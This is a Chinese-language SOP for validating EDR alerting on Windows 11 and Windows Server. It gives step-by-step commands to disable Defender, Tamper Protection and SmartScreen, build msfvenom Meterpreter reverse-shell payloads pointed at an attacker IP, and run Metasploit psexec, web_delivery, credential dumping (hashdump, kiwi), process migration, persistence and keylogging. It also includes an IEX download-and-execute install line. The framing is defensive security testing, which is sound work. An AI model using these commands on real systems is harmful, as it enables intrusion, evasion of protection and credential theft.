# EDR 偵測驗測 SOP — Windows Server & Windows 11

> **目的**：使用 Metasploit 及輔助工具在受測端點觸發 EDR 告警，驗證 hash hunting 記錄是否正常。
> **適用平台**：Windows 11 Pro/Enterprise、Windows Server 2019 / 2022 / 2025

---

## 平台差異速查表

| 項目 | Windows 11 | Windows Server 2019/2022/2025 |
|---|---|---|
| Defender | 預裝、預設啟用 | 預裝（需確認功能已安裝） |
| SmartScreen | 預設啟用，含 Explorer + Edge + App Install Control | **預設未啟用或僅部分啟用**；Server Core 無 GUI 無 SmartScreen |
| Tamper Protection | 預設啟用 | 預設**未啟用**（除非透過 Intune/MDE 管理） |
| Windows Security App | 有完整 GUI | Desktop Experience 才有；Server Core 需用 PowerShell |
| IE Enhanced Security (IE ESC) | 無 | **預設啟用**，會阻擋下載，需另外關閉 |
| 執行政策 | ExecutionPolicy 通常 Restricted | 通常 RemoteSigned |
| UAC | 預設啟用 | 預設啟用但提示較少 |

---

## Phase 0：環境準備（兩平台共用）

### 0-1. 確認 Defender 功能狀態

```powershell
# 查看 Defender 狀態
Get-MpComputerStatus | Select-Object AMServiceEnabled, RealTimeProtectionEnabled, AntivirusEnabled, IoavProtectionEnabled
```

**Windows Server 額外步驟**（如果 Defender 未安裝）：

```powershell
# Server 2019/2022 安裝 Defender 功能
Install-WindowsFeature -Name Windows-Defender -IncludeManagementTools
```

### 0-2. 建立測試目錄

```powershell
New-Item -ItemType Directory -Path "C:\EDR_Test" -Force
```

### 0-3. 備份目前設定（測試完要還原）

```powershell
# 備份 Defender 設定
Get-MpPreference | Export-Clixml "C:\EDR_Test\defender_backup.xml"

# 備份 SmartScreen Registry
reg export "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" "C:\EDR_Test\explorer_reg_backup.reg" /y
reg export "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" "C:\EDR_Test\smartscreen_policy_backup.reg" /y 2>$null
```

---

## Phase 1：關閉 Defender / SmartScreen 干擾

> **重點**：Defender 排除 ≠ SmartScreen 排除，它們是完全獨立的機制。

### 1-1. Defender 排除路徑與程序

```powershell
# 排除測試目錄
Add-MpPreference -ExclusionPath "C:\EDR_Test"

# 排除特定副檔名（選用）
Add-MpPreference -ExclusionExtension ".exe",".dll",".ps1",".hta"

# 驗證排除生效
Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
```

### 1-2. 關閉 Tamper Protection

**此步驟必須先做，否則後續 Registry/GPO 修改會被自動還原。**

| 平台 | 方法 |
|---|---|
| **Win11**（GUI） | Windows 安全性 → 病毒與威脅防護 → 管理設定 → 關閉「竄改防護」 |
| **Win11**（Intune 管理） | 需從 Intune Portal 關閉，本機無法覆寫 |
| **Server Desktop Experience** | 同 Win11 GUI 路徑 |
| **Server Core** | Tamper Protection 預設未啟用，通常不需處理 |

驗證：

```powershell
Get-MpComputerStatus | Select-Object IsTamperProtected
# 應為 False
```

### 1-3. 關閉 SmartScreen

#### Windows 11（三個開關都要關）

**Registry 方法（推薦）：**

```powershell
# 1) Explorer SmartScreen — 檔案執行時的「Windows 已保護您的電腦」
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off"

# 2) App Install Control — 「僅允許來自 Microsoft Store 的應用程式」
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "AicEnabled" -Value "Anywhere"

# 3) Edge SmartScreen（如果從 Edge 下載 payload）
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Edge" -Force | Out-Null
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Edge" -Name "SmartScreenEnabled" -Value 0

# 4) WebContentEvaluation（全域 URL 信譽檢查）
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\AppHost" -Name "EnableWebContentEvaluation" -Value 0
```

**GUI 方法（備用）：**

Windows 安全性 → 應用程式與瀏覽器控制 → 信譽型保護設定 → 關閉全部四個開關。

#### Windows Server 2019/2022/2025

SmartScreen 在 Server 上通常**不是問題**，但如果有安裝 Desktop Experience 且有啟用：

```powershell
# 檢查是否有 SmartScreen 設定
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -ErrorAction SilentlyContinue

# 如有，關閉
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off"
```

**Server 特有：關閉 IE Enhanced Security Configuration（IE ESC）**

```powershell
# 關閉 Administrators 的 IE ESC
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\{A509B1A7-37EF-4b3f-8CFC-4F3A74704073}" -Name "IsInstalled" -Value 0

# 關閉 Users 的 IE ESC
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\{A509B1A8-37EF-4b3f-8CFC-4F3A74704073}" -Name "IsInstalled" -Value 0

# 重啟 Explorer 生效
Stop-Process -Name explorer -Force -ErrorAction SilentlyContinue
```

### 1-4. 統一驗證

```powershell
Write-Host "=== Defender ===" -ForegroundColor Cyan
Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled, IsTamperProtected, IoavProtectionEnabled
Write-Host "`n=== Exclusions ===" -ForegroundColor Cyan
Get-MpPreference | Select-Object ExclusionPath, ExclusionExtension
Write-Host "`n=== SmartScreen ===" -ForegroundColor Cyan
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name SmartScreenEnabled -ErrorAction SilentlyContinue
```

---

## Phase 2：產生測試樣本（攻擊機端）

在 Kali / 攻擊機上操作。每個樣本產生後立即記錄 hash。

### Test 1 — EICAR 標準測試檔

```bash
echo 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > /tmp/eicar.com
sha256sum /tmp/eicar.com
# 已知 MD5: 44d88612fea8a8f36de82e1278abb02f
```

**預期偵測**：靜態特徵比對、hash 命中

### Test 2 — Msfvenom reverse_tcp EXE

```bash
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=<攻擊機IP> LPORT=4444 \
  -f exe -o /tmp/test_revtcp.exe
sha256sum /tmp/test_revtcp.exe
```

**預期偵測**：已知惡意 PE hash、Meterpreter shellcode signature

### Test 3 — Msfvenom calc.exe exec（行為偵測）

```bash
msfvenom -p windows/exec CMD="calc.exe" \
  -f exe -o /tmp/test_calc.exe
sha256sum /tmp/test_calc.exe
```

**預期偵測**：可疑程式啟動子程序（calc.exe spawn from unknown parent）

### Test 4 — DLL 側載測試

```bash
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=<攻擊機IP> LPORT=4445 \
  -f dll -o /tmp/test_inject.dll
sha256sum /tmp/test_inject.dll
```

**預期偵測**：可疑 DLL 載入、hash hunting 命中

### Test 5 — PowerShell 腳本（Fileless 偵測）

```bash
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=<攻擊機IP> LPORT=4446 \
  -f psh -o /tmp/test_fileless.ps1
sha256sum /tmp/test_fileless.ps1
```

**預期偵測**：可疑 PowerShell 腳本執行、AMSI 偵測、script block logging

### Test 6 — HTA 下載鏈

```bash
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=<攻擊機IP> LPORT=4447 \
  -f hta-psh -o /tmp/test_payload.hta
sha256sum /tmp/test_payload.hta
```

**預期偵測**：mshta.exe 可疑執行、LOLBin 濫用告警

### Test 7 — MSI Installer 包裝

```bash
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=<攻擊機IP> LPORT=4448 \
  -f msi -o /tmp/test_installer.msi
sha256sum /tmp/test_installer.msi
```

**預期偵測**：可疑 MSI 安裝行為、msiexec.exe 觸發

---

## Phase 3：受測端點執行（逐一測試）

### 建立 Hash 追蹤表

在測試前先建一張追蹤表：

| # | 檔案名稱 | SHA256 | 平台 | 執行方式 | EDR 告警(Y/N) | Hash Hunting 記錄(Y/N) | 告警名稱/類型 | 備註 |
|---|---|---|---|---|---|---|---|---|
| 1 | eicar.com | (填入) | Win11 / Server | 落地 | | | | |
| 2 | test_revtcp.exe | (填入) | Win11 / Server | 雙擊執行 | | | | |
| ... | | | | | | | | |

### 執行 SOP（每個樣本）

1. **傳輸檔案**到受測端點 `C:\EDR_Test\`（用 SMB copy、SCP、或 USB）
2. **記錄傳輸時間**（用於對照 EDR timeline）
3. **執行**：

```powershell
# EXE 類
cmd /c "C:\EDR_Test\test_revtcp.exe"

# DLL 類
rundll32.exe C:\EDR_Test\test_inject.dll,DllMain

# PowerShell 類
powershell -ExecutionPolicy Bypass -File "C:\EDR_Test\test_fileless.ps1"

# HTA 類
mshta.exe "C:\EDR_Test\test_payload.hta"

# MSI 類
msiexec /i "C:\EDR_Test\test_installer.msi" /qn
```

4. **等待 1-3 分鐘**讓 EDR agent 上傳事件
5. **到 XCockpit 檢查**：
   - Dashboard → 告警列表，搜尋對應時間區間
   - Hash Hunting → 貼上 SHA256 搜尋
   - Timeline → 查看程序執行鏈（parent → child process）
6. **記錄結果**到追蹤表
7. **清理該樣本**後再測下一個

---

## Phase 4：Metasploit Console 進階場景

> 以下需要攻擊機開 msfconsole 接收 session。

### 4-1. 監聽端設定（攻擊機）

```
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <攻擊機IP>
set LPORT 4444
run -j
```

### 4-2. PSExec 橫向移動測試

```
use exploit/windows/smb/psexec
set RHOSTS <受測機IP>
set SMBUser <測試帳號>
set SMBPass <測試密碼>
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <攻擊機IP>
run
```

| 平台差異 | 說明 |
|---|---|
| Win11 | 需啟用 Admin Share（`ADMIN$`），預設可能被防火牆擋 |
| Server | Admin Share 預設開啟，較容易成功 |

**預期偵測**：SMB 橫向移動、服務建立、PsExec-like 行為

### 4-3. Web Delivery — Fileless

```
use exploit/multi/script/web_delivery
set TARGET 2
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <攻擊機IP>
set LPORT 8080
run
```

複製輸出的 PowerShell one-liner，在受測機執行。

**Win11 注意**：AMSI 可能攔截，需確認 EDR 記錄的是 AMSI event 還是 behavioral event。
**Server 注意**：Constrained Language Mode 啟用時 PowerShell payload 可能失敗。

### 4-4. Post-Exploitation（取得 session 後）

```
# Credential Dumping — 觸發 LSASS 存取告警
run post/windows/gather/hashdump
load kiwi
creds_all

# Process Injection — 觸發注入告警
ps
migrate -p <目標PID>

# Persistence — 觸發持久化機制告警
run persistence -U -i 10 -p 4444 -r <攻擊機IP>

# Screenshot / Keylog — 觸發監控行為告警
screenshot
keyscan_start
```

| 動作 | 預期 EDR 告警類型 |
|---|---|
| hashdump / kiwi | Credential Access, LSASS Memory Read |
| migrate | Process Injection, Cross-Process Access |
| persistence | Registry Modification, Startup Item Created |
| screenshot/keylog | Suspicious API Call, Input Capture |

---

## Phase 5：Atomic Red Team 補充測試

Atomic Red Team 按 MITRE ATT&CK TID 組織，方便對照告警分類。

### 安裝

```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force
IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing)
Install-AtomicRedTeam -getAtomics
```

### 推薦測試 TID

| TID | 名稱 | 說明 | Win11 | Server |
|---|---|---|---|---|
| T1059.001 | PowerShell Execution | 基本 PS 偵測 | ✅ | ✅ |
| T1003.001 | LSASS Credential Dump | 記憶體擷取 | ✅ | ✅ |
| T1547.001 | Registry Run Key | 持久化 | ✅ | ✅ |
| T1218.011 | Rundll32 Proxy Exec | LOLBin 濫用 | ✅ | ✅ |
| T1055.001 | DLL Injection | 程序注入 | ✅ | ✅ |
| T1027 | Obfuscated Files | 混淆偵測 | ✅ | ✅ |
| T1070.001 | Clear Windows Event Log | 反鑑識 | ✅ | ✅ |
| T1053.005 | Scheduled Task | 排程任務持久化 | ✅ | ✅ |

### 執行

```powershell
# 單個技術
Invoke-AtomicTest T1059.001 -GetPrereqs
Invoke-AtomicTest T1059.001

# 清理（測完後）
Invoke-AtomicTest T1059.001 -Cleanup
```

---

## Phase 6：測試完畢還原

```powershell
# 1. 還原 Defender 排除
Remove-MpPreference -ExclusionPath "C:\EDR_Test"
Remove-MpPreference -ExclusionExtension ".exe",".dll",".ps1",".hta"

# 2. 還原 SmartScreen Registry
reg import "C:\EDR_Test\explorer_reg_backup.reg"
reg import "C:\EDR_Test\smartscreen_policy_backup.reg" 2>$null

# 3. 重新啟用 Tamper Protection（GUI 操作）
#    Windows 安全性 → 病毒與威脅防護 → 管理設定 → 開啟「竄改防護」

# 4. Server: 還原 IE ESC
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\{A509B1A7-37EF-4b3f-8CFC-4F3A74704073}" -Name "IsInstalled" -Value 1
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\{A509B1A8-37EF-4b3f-8CFC-4F3A74704073}" -Name "IsInstalled" -Value 1

# 5. 清除測試檔案
Remove-Item -Recurse -Force "C:\EDR_Test"

# 6. 驗證還原
Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled, IsTamperProtected
Get-MpPreference | Select-Object ExclusionPath
```

---

## 常見問題排除

| 症狀 | 原因 | 解法 |
|---|---|---|
| Payload 落地即被刪 | Defender Real-Time Protection 排除未生效 | 確認 Tamper Protection 已關 → 重新加排除 |
| 雙擊 EXE 出現藍色警告框 | SmartScreen 阻擋（非 Defender） | Phase 1-3 的四個 Registry 全部關閉 |
| Server 上 PowerShell 拒絕執行 | ExecutionPolicy 限制 | `Set-ExecutionPolicy Bypass -Scope Process` |
| Server 下載檔案被 IE 擋 | IE ESC 啟用 | 關閉 IE ESC（Phase 1-3） |
| PSExec 模組連不上 | 防火牆擋 445 | `netsh advfirewall firewall add rule name="SMB Test" dir=in action=allow protocol=TCP localport=445` |
| Post-exploitation hashdump 失敗 | 權限不足 | 確認 session 為 SYSTEM 或用 `getsystem` 提權 |
| AMSI 攔截 PowerShell payload | AMSI 獨立於 Defender 排除 | 這正是要測試的偵測點，記錄 AMSI event |
| Atomic Red Team 安裝失敗 | 網路限制 | 離線安裝：先在有網路的機器 clone repo，再複製到受測機 |
